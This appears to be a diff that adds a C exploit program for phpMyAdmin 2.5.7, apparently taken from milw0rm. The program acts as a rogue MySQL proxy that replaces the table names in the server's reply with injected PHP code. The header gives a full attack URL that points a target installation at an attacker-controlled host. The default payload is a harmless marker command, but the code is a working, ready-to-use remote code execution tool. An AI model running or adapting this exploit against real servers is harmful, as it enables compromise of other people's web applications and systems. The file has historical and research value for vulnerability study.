@@ -1,0 +1,259 @@
+/*    
+ * phpmy-explt.c  
+ * written by Nasir Simbolon <nasir kecapi com>
+ * eagle kecapi com
+ * Jakarta, Indonesia
+ * 
+ * June, 10 2004 
+ * 
+ * A phpMyAdmin-2.5.7 exploite program.
+ * This is a kind of   mysql server wrapper  acts like a proxy except that it will sends a fake table name,
+ * when client query "SHOW TABLES",  by replacing the real table name with a string contains exploite codes.
+ *
+ * Compile : gcc phpmy-explt.c -o phpmy-explt
+ *
+ * run with
+ * ./phpmy-explt
+ *
+ * and go to your target and put 
+ *
+ * http://target/phpMyAdmin-2.5.7/left.php?server=4&cfg[Servers][4][host]=
+ * attacker.host.com&cfg[Servers][4][port]=8889&cfg[Servers][4][auth_type]=config&cfg[Servers]
+ * [4][user]=user&cfg[Servers][4][password]=pass&cfg[Servers][4][connect_type]=tcp&&cfg[Servers]
+ * [4][only_db]=databasename
+ *
+ * fill host,port,user,pass and databasename correctly
+ *
+ */
+
+
+#include<stdio.h>
+#include<sys/socket.h>
+#include<netdb.h>
+
+#define BIND_PORT 8889
+#define MYSQL_PORT 3306
+#define HOSTNAME "localhost"
+#define DATABASE "phpmy"
+
+
+#define BUFFER_LEN 1024
+
+/* This is php code we want to inject into phpMyAdmin 
+   Do NOT use  single quote (') in the string, use double quote (") instead
+*/
+char *phpcodes = "exec(\"touch /tmp/your-phpmyadmin-is-vulnerable\");";
+
+
+  /* This is examples codes I captured when mysql server
+     reply to client's request of query "SHOW TABLES" query.
+     It shows  database  name 'phpmy' and contain one tablename  'mytable'
+     Our aim is to manipulate the data received from mysql server
+     by replacing 'mytable' with our exploide codes.
+     
+     0x1 ,0x0 ,0x0 ,0x1 ,0x1 ,0x1b,0x0 ,0x0 ,0x2 ,0x0 ,
+     0xf ,'T' ,'a' ,'b' ,'l' ,'e' ,'s' ,'_' ,'i' ,'n' ,
+     '_' ,'p' ,'h' ,'p' ,'m' ,'y' ,0x3 ,0x40,0x0 ,0x0 ,
+     0x1 ,-2  ,0x3 ,0x1 ,0x0 ,0x1f,0x1 ,0x0 ,0x0 ,0x3 ,
+     -2  ,8  ,0x0 ,0x0 ,0x4 ,7   ,'m' ,'y' ,'t' ,'a' ,
+     'b' ,'l' ,'e' ,0x1 ,0   ,0   ,0x5 ,-2
+  */
+
+
+int build_exploite_code(char* dbname,char* phpcodes,char** expcode)
+{	
+   char my1[21] = {0x1 ,0x0 ,0x0 ,0x1 ,0x1 ,0x1b,0x0 ,0x0 ,0x2 ,0x0 ,
+     	 	   0xf ,'T' ,'a' ,'b' ,'l' ,'e' ,'s' ,'_' ,'i' ,'n' ,
+     		   '_'}; 
+   /* part of dbname     ('p' ,'h' ,'p' ,'m' ,'y') */
+   char my2[15] = {0x3 ,0x40,0x0 ,0x0 ,0x1 ,-2  ,0x3 ,0x1 ,0x0 ,0x1f,
+	           0x1 ,0x0 ,0x0 ,0x3 ,-2};  
+   /* part of int phpcodes string length +1   (8) */ 
+   char my3[3]  = {0x0 ,0x0 ,0x4};
+   /* part of int phpcodes string length      (7) */ 
+   /* part of tablename    ('m' ,'y' ,'t' ,'a' ,'b' ,'l' ,'e' ) */
+   char my4[5]  = {0x1 ,0   ,0   ,0x5 ,-2};
+	
+   int len,i;
+
+   len = 21 + strlen(dbname) + 15 + 1 + 3 + 1 +  strlen(phpcodes) + 5 + 5;
+   *expcode = (char*) malloc(sizeof(char) * len); 
+   
+   i = 0;
+   bcopy(&my1[0],*expcode + i,21);
+   i += 21;
+   bcopy(dbname, *expcode + i,strlen(dbname));
+   i += strlen(dbname);
+   bcopy(&my2[0],*expcode + i,15);
+   i += 15;
+   (*expcode)[i] = 5 + strlen(phpcodes) + 1;
+   i ++;
+   bcopy(&my3[0],*expcode + i,3);
+   i += 3;  
+   (*expcode)[i++] = 5 + strlen(phpcodes) ;
+   /* this is our exploite codes*/
+   (*expcode)[i++] = '\\'; 
+   (*expcode)[i++] = '\''; 
+   (*expcode)[i++] = ';'; 
+   bcopy(phpcodes,*expcode + i,strlen(phpcodes));
+   i += strlen(phpcodes);
+   (*expcode)[i++] = '/'; 
+   (*expcode)[i++] = '*'; 
+   bcopy(&my4[0],*expcode + i,5);
+   
+   return len;
+}
+
+/* connect to mysql server*/
+
+int connect_mysql()
+{
+    int s2;
+    struct sockaddr_in ina;
+    struct hostent *h;
+    
+    h = gethostbyname(HOSTNAME);
+    /* set internet address */
+    bcopy(h->h_addr,(void *)&ina.sin_addr,h->h_length);
+    ina.sin_family = AF_INET;
+    ina.sin_port = htons(MYSQL_PORT);
+    //ina.sin_zero[0]='\0';
+    if((s2=socket(AF_INET,SOCK_STREAM,0)) < 0) 
+  	perror("Socket: ");
+    
+    if(connect(s2,(struct sockaddr *)&ina,sizeof(ina)) < 0 )
+	                   perror("connect()");
+    return s2;
+}
+
+/* listener */
+int listener()
+{
+    int s1;
+    int opt;
+    struct sockaddr_in ina;
+
+    /* set internet address */
+    ina.sin_family = AF_INET;
+    ina.sin_port = htons(BIND_PORT);
+    ina.sin_addr.s_addr = INADDR_ANY;
+
+    if((s1=socket(AF_INET,SOCK_STREAM,0)) < 0) 
+  	perror("Socket: ");
+    
+    opt = 1;
+    setsockopt(s1,SOL_SOCKET, SO_REUSEADDR , (char *)&opt, sizeof(opt) );
+       
+    if(bind(s1,(struct sockaddr *)&ina,sizeof(ina))==-1) 
+	perror("Bind: ");
+	
+    if(listen(s1, 10) == -1) 
+  	perror("Listen"); 
+	
+   return s1;
+}
+
+
+int main(int argc,char* argv[])
+{
+	struct sockaddr_in ina1;
+	int ina1_l;
+	int s_daemon,s_mysql;
+	size_t byte_read,byte_written;
+	char *buf;
+	int sc,event,n_select;
+	fd_set rfds;
+        struct timeval tv;	 
+	int exptlen,i;
+	char *expt;
+	char *dbname=DATABASE;
+	
+	buf = (char*) malloc(sizeof(char) * (BUFFER_LEN));
+	tv.tv_sec  = 15;
+	tv.tv_usec = 0;
+	
+	/* we listen to port */
+	 s_daemon = listener();
+    
+	exptlen = build_exploite_code(dbname,phpcodes,&expt);
+
+	for(;;) 
+	{
+	   fprintf(stderr,"waiting for connection\n");
+	   
+	   if( -1 == (sc = accept(s_daemon,(struct sockaddr *) &ina1,&ina1_l)) ) 
+		  perror("accept()");
+	   /* if we get here, we have a new connection */
+	   fprintf(stderr,"got client connection\n");
+mysql:
+	   /* connect to mysql */
+	   s_mysql = connect_mysql();
+        
+	   for(;;) 
+	    {
+	   	FD_ZERO(&rfds);
+	        FD_SET(sc,&rfds);
+  	   	FD_SET(s_mysql,&rfds);                                
+		
+	        n_select = (sc > s_mysql)? sc : s_mysql;
+
+	    	event = select(n_select+1,&rfds,NULL,NULL,NULL);
+	    	if(-1  == event) 
+		    perror("select()");
+	        else 
+		{	
+		    if(FD_ISSET(s_mysql,&rfds)) 
+		     {
+			byte_read = read(s_mysql,buf,BUFFER_LEN);
+		    	/* check for closing client connection*/
+		    	if(byte_read == 0) 
+	  	        {
+			   shutdown(s_mysql,SHUT_RDWR);
+			   close(s_mysql);
+			   goto mysql;
+		        }
+
+			 /* check data received from mysql server.
+			  * if  buf[11] contain 'T', data received from   mysq server is table list
+			  *
+			  * NOW we replace the table with our exploite codes and send them to client
+			  */
+		        if( 'T' == buf[11])
+			{
+		           for(i=0;i<exptlen;i++) 
+		              buf[i] = expt[i];
+		           byte_read = exptlen;
+		        }
+		       
+		        if(write(sc, buf, byte_read) < 0)
+		           break; 
+		     }
+	           
+	             if(FD_ISSET(sc,&rfds)) 
+		     {	
+	   	         byte_read = read(sc,buf,BUFFER_LEN);
+		         /* check for closing client connection*/
+		         if(byte_read == 0) 
+		         {	
+			    close(sc);    
+			    break;
+		         }
+
+		       if(write(s_mysql,buf,byte_read) < 0) 
+			       break; 	    
+		     }    
+#if defined(DEBUG)		     
+		     fprintf(stderr,"data:\n");	
+		     for(i=0;i<byte_read;i++) 
+			     fprintf(stderr," %c(%x) ",buf[i],buf[i]);
+#endif    
+	        }   
+
+	    } 
+	}
+	free(buf);
+	free(expt);
+	return 0;
+}
+
+// milw0rm.com [2004-07-04]
